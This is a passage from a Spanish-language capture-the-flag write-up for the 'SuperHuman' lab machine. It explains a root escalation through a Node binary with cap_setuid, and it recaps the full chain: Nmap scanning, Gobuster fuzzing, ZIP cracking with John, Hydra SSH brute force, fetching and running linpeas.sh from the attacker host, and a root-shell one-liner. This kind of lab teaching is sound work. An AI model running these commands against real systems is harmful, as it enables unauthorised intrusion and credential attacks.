Le dice a Node que ejecute el código JavaScript entre comillas directamente, sin necesidad de crear un archivo `.js`.

#### `process.setuid(0)`
Pide al proceso actual que cambie su UID a 0.

Eso solo funcionará si el proceso tiene permisos suficientes para ello. Aquí los tiene gracias a `cap_setuid`.

#### `require("child_process")`
Carga el módulo interno de Node que permite crear procesos del sistema.

#### `.spawn("/bin/sh", {stdio: [0, 1, 2]})`
Lanza una shell `/bin/sh` y conecta su entrada, salida y errores a nuestra terminal actual.

### Qué significa `stdio: [0, 1, 2]`

Son los descriptores estándar del proceso:

- `0` → stdin → teclado
- `1` → stdout → salida normal
- `2` → stderr → errores

Eso hace que la shell sea interactiva desde nuestra sesión actual.

### Resultado

Obtenemos shell como root:

```bash
# whoami
root
```

### Por qué funciona realmente

Porque se juntan dos cosas:

1. `node` tiene una capability demasiado poderosa (`cap_setuid`)
2. Node permite ejecutar código arbitrario como usuario no privilegiado

Entonces nosotros hacemos que el proceso cambie a UID 0 y, una vez convertido en root, abra una shell.

### Por qué esto es un fallo grave

Porque otorgar `cap_setuid` a Node es casi como dar un SUID root moderno a un entorno de scripting.

No es literalmente igual en implementación, pero en la práctica es gravísimo.

---

## 24. Escalada a root

Una vez lanzado el payload, somos root.

Sin embargo, `ls` sigue sin funcionar correctamente, así que seguimos usando `dir` y `cat`.

Vamos navegando:

```bash
dir
cd ..
dir
cd ..
dir
cd root
dir
cat root.txt
```

### Ruta recorrida

Desde `/home/fred`:

- subimos a `/home`
- subimos a `/`
- entramos en `/root`
- leemos `root.txt`

Contenido:

```text
Imthesuperhuman
```

Ya hemos completado la máquina.

![Imagen 7 - Flag enviada correctamente](files/imagen7_flag_enviada.png)

---

## 25. Resumen técnico del ataque

La cadena de compromiso completa ha sido:

1. Resolver un problema de virtualización y red usando **modo puente** en VirtualBox y VMware.
2. Descubrir la IP de la víctima con **Nmap host discovery**.
3. Identificar la máquina correcta por el prefijo MAC de **VirtualBox**.
4. Enumerar puertos y detectar **SSH** y **Apache**.
5. Revisar el código fuente de la web y localizar una imagen y, después, mediante fuzzing, un archivo interesante: `notes-tips.txt`.
6. Decodificar el contenido de `notes-tips.txt` con **CyberChef** como **Base85**.
7. Inferir la existencia del archivo `salome_and_me.zip`.
8. Descargar el ZIP y crackear su contraseña con `zip2john` + `john`.
9. Extraer un poema con pistas semánticas.
10. Construir un diccionario personalizado desde el poema.
11. Atacar **SSH** con **Hydra** para el usuario `fred`.
12. Obtener acceso inicial como `fred`.
13. Detectar un comportamiento anómalo de `ls` y adaptarse usando `dir`.
14. Ejecutar **LinPEAS** para enumeración local.
15. Encontrar una capability peligrosa en `/usr/bin/node`: `cap_setuid+ep`.
16. Explotarla con `node -e 'process.setuid(0)...'`.
17. Conseguir una shell root.
18. Leer `root.txt`.

---

## 26. Conceptos importantes aprendidos

### 1. Modo puente vs NAT

El modo puente coloca la VM directamente en la red real. NAT la esconde detrás del host. Para laboratorios con varias VMs en hipervisores distintos, el modo puente suele ser la opción más directa si quieres que todas se vean.

### 2. OUI y MAC address

La MAC no solo identifica una tarjeta de red, también da pistas del fabricante mediante el OUI. Eso ayuda a distinguir si una IP pertenece a VMware, VirtualBox, un router, una tarjeta Wi‑Fi real, etc.

### 3. Host discovery con Nmap

Antes de atacar puertos, hay que saber qué host es la víctima. Un buen descubrimiento reduce muchísimo el tiempo perdido.

### 4. Fuzzing web

Una portada vacía no significa una aplicación vacía. Los directorios y archivos ocultos son una fuente clásica de pistas.

### 5. CyberChef y detección de codificaciones

Muchos retos esconden datos en codificaciones menos habituales que base64. CyberChef es especialmente útil para reconocer rápidamente transformaciones raras.

### 6. Cracking de ZIPs

No se ataca el ZIP directamente “leyéndolo”, sino extrayendo un hash o representación adecuada y crackeándolo offline.

### 7. Diccionarios contextuales

Un diccionario construido a partir del contexto de la máquina muchas veces es más eficaz que un ataque bruto indiscriminado.

### 8. Restricciones de comandos

Cuando un comando falla o ha sido saboteado, hay que pensar en alternativas equivalentes (`dir`, `echo *`, `grep "" archivo`, rutas absolutas, symlinks, etc.).

### 9. PATH hijacking

Es un concepto esencial en Linux. Comprender cómo el shell resuelve un comando permite tanto atacar como defender/bypassear entornos manipulados.

### 10. Linux Capabilities

Las capabilities permiten permisos muy finos, pero una capability mal otorgada puede equivaler a una escalada total. `cap_setuid` sobre un intérprete o runtime es especialmente peligroso.

### 11. GTFOBins

Es una referencia imprescindible para post-explotación y escalada local en Linux. Sirve para abusar de binarios “legítimos” cuando tienen SUID, sudo, capabilities u otras condiciones especiales.

---

## 27. Comandos utilizados durante la resolución

### Descubrimiento de red

```bash
sudo nmap -n -sn 192.168.1.42/24
```

### Escaneo completo

```bash
sudo nmap -p- --open -sCV -Pn -T5 -vvv -oN fullscan 192.168.1.40
```

### Fuzzing web

```bash
gobuster dir -u http://192.168.1.40 -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100

gobuster dir -u http://192.168.1.40 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -x html,php,txt -t 100
```

### Metadatos e inspección

```bash
exiftool nietzsche.jpg
strings nietzsche.jpg
```

### ZIP cracking

```bash
zip2john salome_and_me.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
unzip salome_and_me.zip
```

### Crear diccionario personalizado

```bash
cat salome_and_me.txt | tr -s '[:space:][:punct:]' '\n' | sort -u > contraseña.txt
```

### Fuerza bruta SSH

```bash
hydra -l fred -P contraseña.txt 192.168.1.40 ssh
```

### Acceso SSH

```bash
ssh fred@192.168.1.40
```

### Enumeración local y workaround de `ls`

```bash
mkdir /tmp/safe_bin
cd /tmp/safe_bin
wget http://192.168.1.42:90/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
ln -s /usr/bin/dir /tmp/safe_bin/ls
export PATH=/tmp/safe_bin:$PATH
```

### Escalada mediante Node con capability

```bash
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

---

## Conclusión final

SuperHuman es una máquina muy buena para aprender varios conceptos fundamentales de una forma bastante natural:

- redes virtuales y modo puente,
- identificación de hosts por MAC/OUI,
- enumeración con Nmap,
- descubrimiento web con Gobuster,
- análisis de texto codificado,
- cracking de ZIP con John,
- creación de diccionarios específicos,
- fuerza bruta contra SSH,
- adaptación a entornos restringidos,
- PATH hijacking,
- y explotación de Linux capabilities.

Lo más valioso de esta máquina no es solo llegar a root, sino entender por qué cada pista lleva a la siguiente y cómo pequeños detalles aparentemente “decorativos” terminan formando una cadena de explotación completa.
